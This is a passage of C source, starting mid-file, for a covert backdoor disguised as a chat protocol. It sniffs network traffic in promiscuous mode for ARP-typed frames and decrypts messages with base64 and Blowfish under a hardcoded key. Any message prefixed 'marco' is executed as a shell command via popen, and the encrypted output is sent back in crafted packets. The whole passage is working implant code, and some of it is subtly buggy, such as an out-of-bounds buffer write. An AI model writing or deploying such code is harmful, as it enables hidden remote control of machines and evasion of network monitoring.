      ctx->S[i][j] = datal;
      ctx->S[i][j + 1] = datar;
    }
  }
}

// BOSS SIXTYFOUR - or - I DON'T NEED INSTRUCTIONS TO KNOW HOW TO ROCK
static const char cb64[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const char cd64[]="|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\]^_`abcdefghijklmnopq";
static void blowfishcbc(unsigned char *ar, int mode, int arsize) { // message string, 0 for encode, 1 for decode
	unsigned long L, R;
	BLOWFISH_CTX dtx;
	Blowfish_Init (&dtx, (unsigned char*)"allcalma", 8);
	int beans = 0;
	//int arsize;
	//arsize = strlen(ar);
	while (beans < arsize) {
		L = 0;
		R = 0;
		int n;
		for (n = 0; n < 8; n++) {
			if (n < 4) {
				if (beans <= 8 || beans >= (arsize-16)) {
					//-----printf("%02x",ar[beans + n]);
				}
				L += (int)ar[beans + n] & 0xff;
				if (n != 3) {
					L <<= 8;
				}
			}
			else {
				if (beans <= 8 || beans >= (arsize-16)) {
					//-----printf("%02x",ar[beans + n]);
				}
				R += (int)ar[beans + n] & 0xff;
				if (n != 7) {
					R <<= 8;
				}
			}
		}
		if (mode == 1) {
			Blowfish_Decrypt(&dtx, &L, &R);
		}
		else {
			Blowfish_Encrypt(&dtx, &L, &R);
		}
		ar[beans] = (L >> 24) & 0xff;
		ar[beans + 1] = (L >> 16) & 0xff;
		ar[beans + 2] = (L >> 8) & 0xff;
		ar[beans + 3] = L & 0xff;
		ar[beans + 4] = (R >> 24) & 0xff;
		ar[beans + 5] = (R >> 16) & 0xff;
		ar[beans + 6] = (R >> 8) & 0xff;
		ar[beans + 7] = R & 0xff;
		
		if (beans <= 8 || beans >= (arsize-16)) {
			//-----printf(" L %08lX R %08lX\n", L, R);
		}
		beans += 8;
	}
	//beans++;
	//ar[beans] = '\0';
}
static void encodeblock(unsigned char *in, unsigned char *out, int len) {
    out[0] = (unsigned char) cb64[ (int)(in[0] >> 2) ];
    out[1] = (unsigned char) cb64[ (int)(((in[0] & 0x03) << 4) | ((in[1] & 0xf0) >> 4)) ];
    out[2] = (unsigned char) (len > 1 ? cb64[ (int)(((in[1] & 0x0f) << 2) | ((in[2] & 0xc0) >> 6)) ] : '=');
    out[3] = (unsigned char) (len > 2 ? cb64[ (int)(in[2] & 0x3f) ] : '=');
}
static void encode(unsigned char *ar, int size) {
    unsigned char in[4];
    unsigned char out[5];
    unsigned char result[size * 2];
    int j, i, len, k;
	k = 0;
	j = 0;
	//size += 3; // I don't know why, but lets try this
    *in = (unsigned char) 0;
    *out = (unsigned char) 0;
    //printf("J: %d\nSize: %d\n", j, size);
    while (j < size) {
        len = 0;
        for (i = 0; i < 3; i++) {
		if (j + i > size+1) {
			//break;
			in[i] = (unsigned char) 0;
		}
		else {
			in[i] = (unsigned char) ar[j];
			len++;
		}
		if (j < 6 || j > (size - 11)) {
			//---printf("J2: %d I2: %d Size2: %d ", j, i, size);
			//-----printf("%c [%02x] ", in[i], in[i]);
		}
		j++;
        }
        if (len > 0) {
            encodeblock(in, out, len);
		if (j < 7 || j > (size - 11)) {
			out[4] = '\0';
			//-----printf("OUT: %s\n", out);
		}
            for (i = 0; i < 4; i++) {
		result[k] = out[i];
		k++;
            }
        }
    }
    result[k] = '\0';
    int copyover;
    int resultlen;
    resultlen = strlen(result);
    //resultlen -= 4; // to get rid of the +3 from above, for some reason
    for (copyover = 0; copyover < resultlen; copyover++) {
		if (result[copyover] == '=') {
			ar[copyover] = '\0';
		}
		else {
			ar[copyover] = result[copyover];
		}
    }
    //ar[copyover] = '\0';
    //printf("B64ENCar: %s\nB64ENCres: %s\n", ar, result);
}
static void decodeblock(unsigned char *in, unsigned char *out) {
    out[0] = (unsigned char) (in[0] << 2 | in[1] >> 4);
    out[1] = (unsigned char) (in[1] << 4 | in[2] >> 2);
    out[2] = (unsigned char) (((in[2] << 6) & 0xc0) | in[3]);
}
static int decode(unsigned char *ar, int size) { // handles unb64, then blowfish undecode cbc
	int retcode = 0;
	unsigned char result[size * 2]; // i dunno, just in case... i know b64 likes to do size over four times three or whatever
	unsigned char in[5];
	unsigned char out[4];
	int v, i, len;
	int j = 0;
	int k = 0;

	*in = (unsigned char) 0;
	*out = (unsigned char) 0;
	while (j < size) {
		for (len = 0, i = 0; i < 4; i++) {
			v = 0;
			v = ar[j];
			if (v == 0) { // stop all this when we find a null, i guess
				break;
			}
			v = ((v < 43 || v > 122) ? 0 : (int) cd64[v-43]);
			if(v != 0) {
				v = ((v == (int)'$') ? 0 : v - 61);
			}
			len++;
			if(v != 0) {
				in[i] = (unsigned char) (v - 1);
			}
			j++;
		}
		if (len > 0) {
			decodeblock(in, out);
			for (i = 0; i < len - 1; i++) {
				result[k] = out[i];
				k++;
			}
		}
	}
	result[k] = '\0';
	//printf("Crypt string: %s\n", result);

	blowfishcbc(result, 1, k);
	//printf("Dec message: %s\n", result);
	if (result[0] == 'm' && result[1] == 'a' && result[2] == 'r' && result[3] == 'c' && result[4] == 'o') {
		unsigned char commandbuf[k];
		int cb;
		for (cb = 6; cb < k; cb++) {
			commandbuf[cb - 6] = result[cb];
		}
		commandbuf[cb] = '\0';
		//printf("CommandBuffer:%s-\n",commandbuf);
		int messagebuilder = 0;
		char message[50000];
		char bfr[50000];
		FILE * fp;
		if((fp=popen(commandbuf, "r")) == NULL) {
		   //-----printf("Error executing command buffer\n");
		}
		//-----printf("\n");
		message[messagebuilder] = '\x0A'; // prepend with a newline for good formatting on shell responses
		messagebuilder++;
		while(fgets(bfr,50000,fp) != NULL){
			int sure;
			int bfrlen;
			bfrlen = strlen(bfr);
			for (sure = 0; sure < bfrlen; sure++) {
				message[messagebuilder] = bfr[sure];
				messagebuilder++;
			}
		}
		while (messagebuilder % 8 != 0) {
			message[messagebuilder] = '\0';
			messagebuilder++;
		}
		messagebuilder--;
		//int nullkiller;
		//nullkiller = strlen(message);
		//printf("Messagelen: %d\n", nullkiller);
		int mtuchunk = 0;
		unsigned char nick[16] = "Polo\0";
		unsigned char tripcode[7] = "Zy9XUQ\0";
		unsigned char lineterminator[3] = "\xFF\0"; // FF is a byte of padding to shift right, randomize later
		unsigned char messagechunk[1250];
		unsigned char commandcode[3];
		while ((mtuchunk * 896) < messagebuilder) {
			int chunker;
			int currentchunk = mtuchunk * 896;
			//int currentchunkmax = (mtuchunk + 1) * 896;
			for(chunker = 0; chunker < 896; chunker++) {
				if ((currentchunk + chunker) > messagebuilder) {
					break;
				}
				else {
					messagechunk[chunker] = message[currentchunk + chunker];
				}
			}
			//while ((currentchunk + chunker) % 8 != 0) { // pad final message packet out to mutliples of 8 using nulls?
			//	messagechunk[chunker] = '\0';
			//	chunker++;
			//}
			//messagechunk[chunker] = '\0';
			//chunker++;
			//----printf("PREBFM%sEND\n",messagechunk);
			blowfishcbc(messagechunk, 0, chunker); // encode message, this returns null characters sometimes, so we need to mark the size beforehand
			//-----printf("BFMessagechunklen: %d\n", chunker);
			int bfm;
			//----printf("\nPREENC\n");
			for (bfm = 0; bfm < chunker; bfm++) {
				if (bfm < 20 || bfm > (chunker - 20)) {
					//-----printf("(%02x)",messagechunk[bfm]);
				}
			}
			//----printf("\nPREENCEND\n");
			//chunker++;
			encode(messagechunk, chunker);
			//printf("B64Messagelen: %d\n", strlen(messagechunk));
			//printf("Message: %s\n", messagechunk);
			if (((mtuchunk + 1) * 896) < messagebuilder) {
				commandcode[0] = '\xF7'; // 7 is our messagebuffer command, F gets chopped off later, we use F so that polo[0] isn't null later
				commandcode[1] = '\0'; // 7 is our messagebuffer command, F gets chopped off later, we use F so that polo[0] isn't null later
			}
			else {
				commandcode[0] = '\xF0'; // 0 is our message command, F gets chopped off later, we use F so that polo[0] isn't null later
				commandcode[1] = '\0'; // 0 is our message command, F gets chopped off later, we use F so that polo[0] isn't null later
			}
			unsigned char polo[1800];
			int shiftprep = 0;
			int currstringlen;
			int poloiterator;
			// add commandcode
			currstringlen = strlen(commandcode);
			for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
				polo[shiftprep] = commandcode[poloiterator];
				shiftprep++;
			}
			// add nick
			currstringlen = strlen(nick);
			for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
				polo[shiftprep] = nick[poloiterator];
				shiftprep++;
			}
			// add tripcode
			currstringlen = strlen(tripcode);
			polo[shiftprep] = ' ';
			shiftprep++;
			polo[shiftprep] = '[';
			shiftprep++;
			for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
				polo[shiftprep] = tripcode[poloiterator];
				shiftprep++;
			}
			polo[shiftprep] = ']';
			shiftprep++;
			polo[shiftprep] = ' ';
			shiftprep++;
			// add message
			currstringlen = strlen(messagechunk);
			for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
				polo[shiftprep] = messagechunk[poloiterator];
				shiftprep++;
			}
			// add lineterminator
			currstringlen = strlen(lineterminator);
			for (poloiterator = 0; poloiterator < currstringlen; poloiterator++) {
				polo[shiftprep] = lineterminator[poloiterator];
				shiftprep++;
			}
			polo[shiftprep] = '\0';
			
			/*  i guess we dont actually do this again, but we can add it later
			blowfishcbc(polo, 0, shiftprep); // encode nick, trip, and encoded message
			*/
			//printf("\nPOLO:%s\n", polo);
			shift_right(polo, (shiftprep + 1), 3);
			int shiftback;
			for (shiftback = 0;shiftback < shiftprep;shiftback++) {
				polo[shiftback] = polo[shiftback + 1];
			}
			polo[shiftback-1] = '\0';
			int poloprint;
			//printf("\nPOLOPRINT\n");
			//for (poloprint = 0; poloprint < shiftprep; poloprint++) {
			//	printf("[%02x]", polo[poloprint]);
			//}
			//printf("\nENDPOLOPRINT\n");
			CreatePacket(polo, shiftback);
			//printf("\nFINALPRINT\n");
			//for (poloprint = 0; poloprint < shiftback; poloprint++) {
			//	printf("[%02x]", FinalPacket[poloprint]);
			//}
			//printf("\nENDFINALPRINT\n");
			SendPacket(shiftback + 13); // because createpacket adds 12 of mac and 2 of etype, -1 for the null
			mtuchunk++;
		}
	}

	return(retcode);
}
void strip_nick_trip(unsigned char *ar, int size) {
	char nick[size];
	char tripcode[7];
	//char encodedmessage[size];
	int nickoffset = 0;
	int tripoffset = 0;
	int messageoffset = 0;
	
	int field = 0; // 0 means we're still in nick, 1 means we've moved onto tripcode, and anything over 1 means we're in the message body
	int last = 0;
	int i = 1; // skip bit 0, it's command type
	for (; i < size; ++i) {
            int next = ar[i];  // ... if the low bit is set, set the carry bit.
		if (field == 0) {
			if (last == 32) { // last was a space
				if (next == 91) { // current matches [
					nick[nickoffset] = '\0';
					field++;
				}
				else {
					nick[nickoffset] = ' ';
					++nickoffset;
					nick[nickoffset] = ar[i];
					++nickoffset;
				}
			}
			else { // last wasnt a space
				if (next != 32) {
					nick[nickoffset] = ar[i];
					++nickoffset;
				}
				// skip 32 here, get it on next pass
			}
		}
		else if (field == 1) {
			if (last == 93) { // last was a ]
				if (next == 32) { // current matches space
					tripcode[tripoffset] = '\0';
					field++;
				}
				else {
					tripcode[tripoffset] = ']';
					++tripoffset;
					tripcode[tripoffset] = ar[i];
					++tripoffset;
				}
			}
			else {
				if (next != 93) {
					tripcode[tripoffset] = ar[i];
					++tripoffset;
				}
				// skip 93 here, get it on next pass
			}
		}
		else {
			//encodedmessage[messageoffset] = ar[i];
			ar[messageoffset] = ar[i];
			++messageoffset;
		}
            last = next;                       // Remember the old carry for next time.
        }
	//encodedmessage[messageoffset] = '\0';
	ar[messageoffset] = '\0';
	//printf("I: %d Nick: %s (%d) Tripcode: %s (%d) Message: %s (%d)\n", i, nick, strlen(nick), tripcode, strlen(tripcode), encodedmessage, strlen(encodedmessage));
	printf("I: %d Nick: %s (%d) Tripcode: %s (%d) Message: %s (%d)\n", i, nick, strlen(nick), tripcode, strlen(tripcode), ar, strlen(ar));
	//decode(encodedmessage, strlen(encodedmessage));
	//decode(ar, strlen(ar));
}


// I guess uchar is 1 byte, ushort is 2, uint is a full word, and doing "uchar something:n" splits up 1 byte into n bits?
typedef struct nopro_header {
    unsigned char nopro_command;
}   NOPRO_HDR;
typedef struct ethernet_header {
    UCHAR dest[6];
    UCHAR source[6];
    USHORT type;
}   ETHER_HDR , *PETHER_HDR , FAR * LPETHER_HDR , ETHERHeader; // I don't think anything beyond ETHER_HDR is referenced again, we can probably remove
 

 
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;
struct sockaddr_in source,dest;
char hex[2];
//Its free!
NOPRO_HDR *noprohdr;
ETHER_HDR *ethhdr;
u_char *data;

int main() {
printf("PID: %d\n\n",getpid());
	unsigned long L = 1, R = 2;
  BLOWFISH_CTX ctx;

  Blowfish_Init (&ctx, (unsigned char*)"allcalma", 8);
  Blowfish_Encrypt(&ctx, &L, &R);
  printf("%08lX %08lX\n", L, R);
  if (L == 0xDF333FD2L && R == 0x30A71BB4L)
	  printf("Test encryption OK.\n");
  else
	  printf("Test encryption failed.\n");
  Blowfish_Decrypt(&ctx, &L, &R);
  if (L == 1 && R == 2)
  	  printf("Test decryption OK.\n");
  else
	  printf("Test decryption failed.\n");
  // ---------------------------

    u_int i, res , inum ;
    u_char errbuf[PCAP_ERRBUF_SIZE], buffer[100];
    u_char *pkt_data;
    time_t seconds;
    struct tm tbreak;
    pcap_if_t *alldevs, *d;
    struct pcap_pkthdr *header;
 
    /* The user didn't provide a packet source: Retrieve the local device list */
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) {
        fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
        return -1;
    }
     
    i = 0;
    /* Print the list */
    for(d = alldevs; d; d = d->next) {
        printf("%d. %s\n    ", ++i, d->name);
        if (d->description) {
            printf(" (%s)\n", d->description);
        }
        else {
            printf(" (No description available)\n");
        }
    }
         
    if (i==0) {
        fprintf(stderr,"No interfaces found! Exiting.\n");
        return -1;
    }
 
    printf("Enter the interface number you would like to sniff : ");
    scanf("%d" , &inum);
    for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++); // Jump to the selected adapter
    if ((fp = pcap_open(d->name, // Open the device
                        100, // snaplen
                        PCAP_OPENFLAG_PROMISCUOUS, // flags
                        20, // read timeout
                        NULL, // remote authentication
                        errbuf)
                        ) == NULL)
    {
        fprintf(stderr,"\nError opening adapter\n");
        return -1;
    }
    //read packets in a loop :)
    while((res = pcap_next_ex(fp, &header, &pkt_data)) >= 0) {
        if(res == 0) { // Timeout elapsed
            continue;
        }
        seconds = header->ts.tv_sec;
        //localtime(&seconds);
        strftime(buffer, 80, "%d-%b-%Y %I:%M:%S %p", &tbreak);
        //print pkt timestamp and pkt len
        //fprintf(logfile , "\nNext Packet : %ld:%ld (Packet Length : %ld bytes) " , header->ts.tv_sec, header->ts.tv_usec, header->len);
        // ---> printf("\nNext Packet : %s.%ld (Packet Length : %ld bytes) " , buffer , header->ts.tv_usec, header->len);
        ProcessPacket(pkt_data , header->caplen);
    }
     
    if(res == -1) {
        fprintf(stderr, "Error reading the packets: %s\n" , pcap_geterr(fp));
        return -1;
    }
    return 0;
}
 
void ProcessPacket(u_char* Buffer, int Size) {
    //Ethernet header
    ethhdr = (ETHER_HDR *)Buffer;
    ++total;

    if (ntohs(ethhdr->type) == 0x0806) {
	    //printf("\n----------------------------------------------------------------------------------------------------------------\nEthertype: 0806\n");
	    Buffer = (Buffer + 14); // skip 12 for mac addresses and 2 for ethertype
	    Size = (Size - 14);
	    PrintData(Buffer , Size);
    }
}
void PrintData (u_char* data , int Size) { //    Print the hex values of the data
    shift_right(data, Size, 5);
    noprohdr = (NOPRO_HDR *)data;
	switch (noprohdr->nopro_command) { //"","^jn]","^kl]","^qt]","^fl]","^rq]","^ss]","^sr]"
            case 0: //Message
		printf("c: Message\n");
		strip_nick_trip(data, Size);
		decode(data, strlen(data));
            break;

            case 1: //Join
		    printf("c: Join\n");
            break;
 
            case 2: //Keepalive
		    printf("c: Keepalive\n");
            break;
 
            case 3: //Quit
		    printf("c: Quit\n");
            break;
 
            case 4: //File Send
		    printf("c: File Send\n");
            break;
	    
            case 5: //File Request
		    printf("c: File Request\n");
            break;
	    
            case 6: //Shell Send
		    printf("c: Shell Send\n");
            break;
	    
            case 7: //Message Buffer
		printf("c: Message Buffer\n");
		strip_nick_trip(data, Size);
		decode(data, strlen(data));
            break;
 
            default:
		    printf("c: Other\n");
            break;
        }
	/* // skip all this shit for now, it wont work since we reuse data now for our decoded b64
    unsigned char a , line[13] , c;
    int j;
     
    //loop over each character and print
    for(i=0 ; i < Size ; i++) {
        c = data[i];
        printf(" %.2x", (unsigned int) c); //Print the hex value for every character , with a space
        a = ( c >=32 && c <=128) ? (unsigned char) c : '.'; //Add the character to data line
        line[i%12] = a;
        if( (i!=0 && (i+1)%12==0) || i == Size - 1) { //if last character of a line , then print the line - 12 characters in 1 line
            line[i%12 + 1] = '\0';
            printf("      ");  //print a big gap of 10 characters between hex and characters
            for( j = strlen(line) ; j < 12; j++) { //Print additional spaces for last lines which might be less than 16 characters in length
                printf("   ");
            }
            printf("%s \n" , line);
        }
    }
    printf("\n");
	*/
}
